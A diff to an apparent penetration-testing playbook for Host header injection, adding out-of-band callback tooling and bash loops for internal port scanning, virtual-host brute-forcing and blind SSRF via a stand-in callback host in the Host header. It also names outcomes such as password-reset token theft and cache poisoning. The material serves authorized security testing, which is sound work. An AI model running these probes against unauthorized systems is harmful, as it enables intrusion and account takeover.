@@ -19,7 +19,8 @@ origin: AI Threat Hunting
 
 - `aith assess kali exec -- curl ...` (Host header manipulation, override header injection, response inspection — all target-facing curl must go through the kali exec wrapper so the request lands in the audit pipeline; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 30`)
 - Browser DevTools (verify reflected Host in rendered pages and network responses)
-- OOB callbacks: check readiness with `aith oob status --json`; start a named client with `aith oob client start <name> --engagement <key> --agent <agent>`; read correlated hits with `aith oob client logs <name> --lines 80`
+- `aith oob mint` / `aith oob poll` — for the SSRF-via-Host vector (§4) and password-reset poisoning (§2): mint a nonce-tagged callback host, send it in the `Host`/`X-Forwarded-Host` header, then `poll` to confirm the backend resolved it. Replaces reading the raw listener log. Readiness: `aith oob status --json`; start a named client with `aith oob client start <name> --engagement <key> --agent <agent>` if none is running.
+- `aith assess anomaly-score` — for virtual-host enumeration (§6) and Host-based port scanning (§4): pipe the per-Host response records (status/length) and let it rank the odd-one-out instead of eyeballing the loop output.
 
 ## Methodology
 
@@ -75,14 +76,21 @@ curl "https://target/page?cb=<same-value>"
 - [ ] Use cache busters (`?cb=<random>`) during detection to avoid poisoning production
 
 ### 4. SSRF via Host Header
-- [ ] Internal port scanning: `Host: localhost:PORT` for common internal ports (22, 80, 443, 3306, 6379, 8080, 9200)
+- [ ] Internal port scanning: `Host: localhost:PORT` for common internal ports (22, 80, 443, 3306, 6379, 8080, 9200). Emit one JSON record per port so the odd-one-out (the open internal port) surfaces instead of being eyeballed:
 ```bash
 for port in 22 80 443 3306 6379 8080 9200; do
-  curl -s -o /dev/null -w "%{http_code} %{size_download} %{time_total} - port $port\n" -H "Host: localhost:$port" https://target/
-done
+  read -r code size <<<"$(curl -s -o /dev/null -w '%{http_code} %{size_download}' -H "Host: localhost:$port" https://target/)"
+  printf '{"url":"localhost:%s","status":%s,"content_length":%s}\n' "$port" "$code" "$size"
+done | aith assess anomaly-score --top 5
 ```
+  The top-ranked record's `anomalous_attributes` (e.g. `status='200'`, `length_bucket='len_512_4096'`) is the port whose response broke from the closed-port baseline — that is your reachable internal service.
 - [ ] Internal host access: `Host: 192.168.1.1`, `Host: 10.0.0.1`
-- [ ] Observe response differences (size, timing, status code) indicating internal routing
+- [ ] Blind SSRF confirmation when no response diff leaks: mint a callback host and route the server to it via the Host header, then poll for the hit:
+```bash
+aith oob mint --technique ssrf --target-url https://target/ --param Host --probe-kind host-header
+curl -H "Host: <nonce>.oob.example.com" https://target/
+aith oob poll --client <name>    # a matched row = the backend resolved your Host
+```
 
 ### 5. Access Control Bypass
 - [ ] Internal-only endpoints gated by Host header: try `Host: localhost`, `Host: 127.0.0.1`, `Host: internal.app`
@@ -97,13 +105,14 @@ curl -v -H "X-Rewrite-URL: /admin" https://target/
 ```
 
 ### 6. Virtual Host Enumeration
-- [ ] Brute-force Host header with known/guessed subdomains to discover hidden vhosts
+- [ ] Brute-force Host header with known/guessed subdomains to discover hidden vhosts. Capture each response as a record and rank the outlier — the hidden vhost is the one whose status/length diverges from the default-vhost cluster:
 ```bash
 for sub in admin staging internal api dev test backend; do
-  curl -s -o /dev/null -w "%{http_code} %{size_download} - $sub.target.example\n" -H "Host: $sub.target.example" https://target/
-done
+  read -r code size <<<"$(curl -s -o /dev/null -w '%{http_code} %{size_download}' -H "Host: $sub.target.example" https://target/)"
+  printf '{"url":"%s.target.example","status":%s,"content_length":%s}\n' "$sub" "$code" "$size"
+done | aith assess anomaly-score --top 5
 ```
-- [ ] Different Host -- different response content = hidden virtual host found
+- [ ] The top-ranked record is the Host whose response broke from the pack (e.g. `internal.target.example` returns a 200 + larger body where the rest 404) = hidden virtual host found. A flat ranking (every score ~0) means every Host returns the same default vhost — no hidden vhost on this wordlist.
 
 ### 7. Connection-State Attacks
 - [ ] On persistent connections (keep-alive), first request with legit Host, second with internal Host
@@ -116,7 +125,7 @@ printf "GET / HTTP/1.1\r\nHost: target.example\r\nConnection: keep-alive\r\n\r\n
 
 - Injection vector (Host header, X-Forwarded-Host, double Host, other override header)
 - Exact request that triggers the behavior (full curl command with headers)
-- Where the injected value appears (response body, Location header, email link, cached response)
+- Where the injected value appears (response body, Location header, email link, cached response), or — for blind Host-based SSRF — the matched probe<->callback pair from `aith oob poll --client <name> --json`
 - Impact: password reset token theft, cache poisoning serving attacker resources, internal service access, admin panel bypass — confirming the Host value is reflected is not enough; you must show the **attacker outcome** (e.g., password reset link in victim's email points to attacker domain and token was captured, poisoned cache entry serves attacker script to victim browsers, internal admin panel is accessible without authentication)
 - Whether override headers bypass Host-locked protections
 - Full request/response pairs for reproducibility
